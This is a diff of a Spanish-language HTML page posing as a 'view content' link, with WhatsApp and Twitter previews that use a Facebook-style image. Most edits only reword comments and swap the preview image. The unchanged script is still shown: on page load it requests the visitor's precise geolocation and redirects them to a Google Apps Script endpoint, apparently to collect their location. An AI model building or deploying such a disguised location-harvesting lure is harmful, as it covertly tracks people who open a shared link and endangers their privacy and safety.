@@ -7,10 +7,6 @@
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <!-- ========================================= -->
-    <!-- INFORMACIÓN DE LA PÁGINA -->
-    <!-- ========================================= -->
-
     <title>Ver contenido</title>
 
     <meta name="description"
@@ -18,7 +14,7 @@
 
 
     <!-- ========================================= -->
-    <!-- VISTA PREVIA PARA WHATSAPP -->
+    <!-- VISTA PREVIA DE WHATSAPP -->
     <!-- ========================================= -->
 
     <meta property="og:title"
@@ -36,7 +32,7 @@
     <!-- IMAGEN DE VISTA PREVIA -->
 
     <meta property="og:image"
-          content="https://dylan78459.github.io/facebook/images%20%281%29.png">
+          content="https://dylan78459.github.io/facebook/logo.png">
 
     <meta property="og:image:type"
           content="image/png">
@@ -49,7 +45,7 @@
 
 
     <!-- ========================================= -->
-    <!-- VISTA PREVIA PARA X / TWITTER -->
+    <!-- VISTA PREVIA PARA REDES SOCIALES -->
     <!-- ========================================= -->
 
     <meta name="twitter:card"
@@ -62,7 +58,7 @@
           content="Accede para visualizar el contenido.">
 
     <meta name="twitter:image"
-          content="https://dylan78459.github.io/facebook/images%20%281%29.png">
+          content="https://dylan78459.github.io/facebook/logo.png">
 
 
     <!-- ========================================= -->
@@ -209,7 +205,6 @@
 
     <script>
 
-
         /*
          * URL DE GOOGLE APPS SCRIPT
          */
@@ -219,22 +214,16 @@
 
 
         /*
-         * FUNCIÓN PARA SOLICITAR UBICACIÓN
+         * SOLICITAR UBICACIÓN
          */
 
         function solicitarUbicacion() {
 
-
             /*
-             * Comprobar si el navegador
-             * permite geolocalización
+             * Comprobar soporte de geolocalización
              */
 
             if (!navigator.geolocation) {
-
-                console.log(
-                    "Este navegador no permite geolocalización."
-                );
 
                 window.location.href = destino;
 
@@ -244,11 +233,10 @@
 
 
             /*
-             * Solicitar ubicación
+             * Solicitar permiso de ubicación
              */
 
             navigator.geolocation.getCurrentPosition(
-
 
                 /*
                  * UBICACIÓN OBTENIDA
@@ -256,14 +244,11 @@
 
                 function(position) {
 
-
                     const latitud =
                         position.coords.latitude;
 
-
                     const longitud =
                         position.coords.longitude;
-
 
                     const precision =
                         position.coords.accuracy;
@@ -274,12 +259,10 @@
                         latitud
                     );
 
-
                     console.log(
                         "Longitud:",
                         longitud
                     );
-
 
                     console.log(
                         "Precisión:",
@@ -298,22 +281,19 @@
 
 
                 /*
-                 * ERROR O PERMISO DENEGADO
+                 * PERMISO DENEGADO / ERROR
                  */
 
                 function(error) {
-
 
                     console.log(
                         "No se pudo obtener la ubicación."
                     );
 
-
                     console.log(
                         "Código:",
                         error.code
                     );
-
 
                     console.log(
                         "Mensaje:",
@@ -322,9 +302,8 @@
 
 
                     /*
-                     * Si el usuario rechaza
-                     * el permiso, continúa
-                     * hacia Apps Script.
+                     * Continuar aunque el usuario
+                     * no conceda la ubicación
                      */
 
                     window.location.href =
@@ -334,17 +313,13 @@
 
 
                 /*
-                 * CONFIGURACIÓN
+                 * CONFIGURACIÓN DE GEOLOCALIZACIÓN
                  */
 
                 {
-
                     enableHighAccuracy: true,
-
                     timeout: 10000,
-
                     maximumAge: 0
-
                 }
 
             );
@@ -353,14 +328,13 @@
 
 
         /*
-         * EJECUTAR AL CARGAR LA PÁGINA
+         * EJECUTAR CUANDO CARGUE LA PÁGINA
          */
 
         window.addEventListener(
             "load",
             solicitarUbicacion
         );
-
 
     </script>
 
